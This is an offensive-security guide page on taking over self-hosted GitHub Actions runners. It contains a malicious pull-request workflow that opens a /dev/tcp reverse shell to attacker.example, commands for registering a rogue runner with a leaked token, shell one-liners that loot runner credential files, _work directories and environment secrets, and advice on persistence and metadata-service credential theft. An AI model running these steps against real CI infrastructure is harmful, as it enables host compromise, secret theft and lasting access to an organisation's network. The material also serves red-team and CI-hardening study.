---
title: "Self-hosted runner takeover: RCE and persistence on CI runner hosts"
order: 5
description: "Gaining code execution on non-ephemeral self-hosted GitHub Actions runners through pull request workflows, registering a rogue runner with a leaked registration token, looting the runner work and credential directories, and pivoting into the internal network."
keywords:
  - self-hosted runner
  - runs-on self-hosted
  - runner registration token
  - _work directory
  - CI network pivot
---

# Self-hosted runner takeover

A self-hosted runner is a machine the org operates to execute Actions jobs, and it is usually inside the corporate network. Two properties make it a prime target: it runs **untrusted PR workflow code** when a repo accepts fork contributions, and it is **non-ephemeral by default**, so it keeps state (and your implant) between jobs. Landing a job on such a runner is host RCE on infrastructure that firewalls generally trust.

## Fingerprint

Find repos that route jobs to self-hosted runners and accept external PRs:

```bash
# Workflows targeting self-hosted runners
for f in $(gh api /repos/ACME/service/contents/.github/workflows -q '.[].path'); do
  gh api "/repos/ACME/service/contents/$f" -q '.content' | base64 -d | grep -Hn 'runs-on:.*self-hosted' && echo "  <- $f"
done

# Org/repo runners (needs admin: lists online runners and labels)
gh api /orgs/ACME/actions/runners -q '.runners[] | [.name, .status, (.labels|map(.name)|join(","))] | @tsv'
gh api /repos/ACME/service/actions/runners
```

`runs-on: [self-hosted, linux, x64]` plus a repo that runs workflows on `pull_request` (not only `pull_request_target`) is the direct path: a fork PR's workflow runs on their hardware.

## RCE through a pull request workflow

Where a repo runs CI on `pull_request` and that CI targets a self-hosted runner, a PR that edits the workflow or any script it calls executes on the runner host. The cleanest is a PR adding or modifying a job that lands a reverse shell:

```yaml
# .github/workflows/ci.yml as submitted in the attacker's PR
on: [pull_request]
jobs:
  test:
    runs-on: [self-hosted, linux]      # their machine, not GitHub's
    steps:
      - run: |
          id; hostname; ip a                                  # confirm where we landed
          bash -c 'exec 5<>/dev/tcp/attacker.example/4444; cat <&5 | bash >&5 2>&5 &'
```

When the maintainer's CI runs the PR (or a workflow runs fork PRs without approval), `test` executes on the runner. `id`/`hostname`/`ip a` in the log confirm the host, user, and that you are inside the internal network. Because the runner is non-ephemeral, a cron entry or a modified `~/.bashrc` dropped here survives into later jobs from every repo that uses the runner.

## Registering a rogue runner

If you recover a **runner registration token** (short-lived, scoped to add runners) or can request one with an admin token, you attach your own machine as a runner and receive jobs, including ones carrying secrets:

```bash
# Mint a registration token (needs admin on the org/repo)
gh api -X POST /orgs/ACME/actions/runners/registration-token -q .token
# -> AADD... (valid ~1h)

# On an attacker host, register against the org and run jobs
./config.sh --url https://github.com/ACME --token AADD... --labels self-hosted,linux --unattended
./run.sh
```

Once registered with matching labels, your host is eligible for any job that targets those labels; jobs arrive with their `GITHUB_TOKEN` and injected secrets in the environment, handing you credentials from workflows you never wrote.

## Looting an owned runner

Having landed on a legitimate runner, the filesystem holds the rest of the org's CI secrets:

```bash
# The agent install dir (commonly /actions-runner or /home/<user>/actions-runner)
R=$(dirname "$(readlink -f "$(pgrep -af Runner.Listener | awk '{print $NF}' | head -1)")" 2>/dev/null)
cat "$R/.credentials" "$R/.credentials_rsaparams" "$R/.runner" 2>/dev/null   # runner identity + keys
ls -la "$R/_work"                                                            # checked-out repos + build state
grep -rIER 'AKIA|ghp_|ghs_|BEGIN .*PRIVATE KEY|token' "$R/_work" 2>/dev/null
env | grep -iE 'token|secret|key'                                           # live job secrets in the process env
```

`.credentials` / `.credentials_rsaparams` are the runner's own authentication to GitHub; `_work` holds every repo the runner has built plus whatever secrets those builds wrote to disk. Other processes' environments on a busy runner expose in-flight job secrets.

## Follow-on

- **Network pivot**: the runner sits inside the internal network with routes a GitHub-hosted runner never has; use it to reach internal services, metadata endpoints on cloud-hosted runners (IMDS for instance-role keys), and package registries.
- **Secret and token theft**: `GITHUB_TOKEN` and injected secrets from jobs feed [token and GITHUB_TOKEN abuse](token-and-github-token-abuse.md) and supply-chain pushes.
- **Persistence**: because the host is non-ephemeral, a dropped implant, a modified runner binary, or a rogue registered runner gives durable CI access that reappears on every subsequent job.

## Exploitation notes

- `pull_request` + `self-hosted` is the dangerous pairing: fork PRs run on their hardware. `pull_request_target` on self-hosted is worse still (write token plus host RCE).
- Default runners are non-ephemeral: state persists between jobs, so persistence is trivial and job secrets from other repos accumulate in `_work` and process environments.
- A registration token is enough to join your own runner and passively collect jobs and their secrets; you do not need to compromise an existing host.
- Cloud-hosted self-hosted runners expose the instance metadata service to your job; pull the instance-role credentials for an immediate cloud pivot.

## Tools

- **gato** (Praetorian): detects repos whose workflows reach self-hosted runners and can submit PoC workflows.
- **actions/runner**: the official agent (`config.sh`/`run.sh`) used to register a rogue runner.
- **runner-poisoning / Gato-X**: tooling around non-ephemeral runner persistence and job interception.

## References

- [GitHub: self-hosted runner security and untrusted workflows](https://docs.github.com/en/actions/how-tos/manage-runners/self-hosted-runners/manage-access)
- [GitHub REST API: self-hosted runners and registration tokens](https://docs.github.com/en/rest/actions/self-hosted-runners)
- [Praetorian: self-hosted runner takeover with Gato](https://www.praetorian.com/blog/self-hosted-github-runners-are-backdoors/)
- [Synacktiv: compromising GitHub self-hosted runners](https://www.synacktiv.com/en/publications/github-actions-exploitation-self-hosted-runners.html)
- [GitHub Security Lab: one supply chain attack to rule them all (runners)](https://securitylab.github.com/resources/github-actions-building-blocks/)
